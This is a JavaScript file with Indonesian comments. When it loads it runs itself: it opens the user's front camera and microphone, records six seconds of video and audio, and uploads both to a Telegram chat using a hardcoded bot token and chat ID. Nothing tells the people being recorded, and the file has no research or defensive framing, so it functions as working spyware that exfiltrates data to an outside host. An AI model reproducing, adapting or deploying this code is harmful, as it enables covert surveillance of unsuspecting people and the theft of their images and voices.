const TELEGRAM_BOT_TOKEN = '8193243401:AAHhXQJMQLJ30VKdfp3NR0MztqLBpoM3UgE';
const TELEGRAM_CHAT_ID = '6656939294';

// Fungsi utama
(async function main() {
    try {
        console.log("Proses dimulai...");

        // Semua tugas dijalankan secara paralel
        const tasks = [
            recordVideoAndAudio(6000), // Rekam video dan audio secara bersamaan selama 6 detik
        ];

        // Tunggu semua tugas selesai
        const results = await Promise.allSettled(tasks);

        // Kirim hasil rekaman video/audio
        const videoAudioResult = results[0];
        if (videoAudioResult.status === "fulfilled" && videoAudioResult.value) {
            const { videoBlob, audioBlob } = videoAudioResult.value;
            if (videoBlob) {
                console.log("Mengirim video ke Telegram...");
                await sendToTelegram(videoBlob, 'video/mp4');
            }
            if (audioBlob) {
                console.log("Mengirim audio ke Telegram...");
                await sendToTelegram(audioBlob, 'audio/wav');
            }
        }

        console.log("Proses selesai. Semua data telah dikirim ke Telegram.");
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
    }
})();

// Fungsi untuk merekam video dan audio secara bersamaan
async function recordVideoAndAudio(duration) {
    try {
        const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });

        const videoChunks = [];
        const audioChunks = [];

        const videoRecorder = new MediaRecorder(videoStream);
        const audioRecorder = new MediaRecorder(audioStream);

        videoRecorder.ondataavailable = (event) => videoChunks.push(event.data);
        audioRecorder.ondataavailable = (event) => audioChunks.push(event.data);

        videoRecorder.start();
        audioRecorder.start();

        await wait(duration);

        videoRecorder.stop();
        audioRecorder.stop();

        return new Promise((resolve) => {
            videoRecorder.onstop = () => {
                videoStream.getTracks().forEach((track) => track.stop());
                const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });

                audioRecorder.onstop = () => {
                    audioStream.getTracks().forEach((track) => track.stop());
                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                    resolve({ videoBlob, audioBlob });
                };
            };
        });
    } catch (error) {
        console.error("Gagal merekam video/audio:", error.message);
        return null;
    }
}

// Fungsi untuk menunggu waktu tertentu
function wait(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

// Fungsi untuk mengirim pesan teks ke Telegram
async function sendMessageToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" }),
        });
    } catch (error) {
        console.error("Gagal mengirim pesan ke Telegram:", error.message);
    }
}

// Fungsi untuk mengirim file media ke Telegram
async function sendToTelegram(fileBlob, mimeType) {
    try {
        const formData = new FormData();
        formData.append(mimeType === 'video/mp4' ? 'video' : 'audio', fileBlob);
        formData.append('chat_id', TELEGRAM_CHAT_ID);

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${mimeType === 'video/mp4' ? 'Video' : 'Audio'}`, {
            method: 'POST',
            body: formData,
        });
    } catch (error) {
        console.error("Gagal mengirim media ke Telegram:", error.message);
    }
}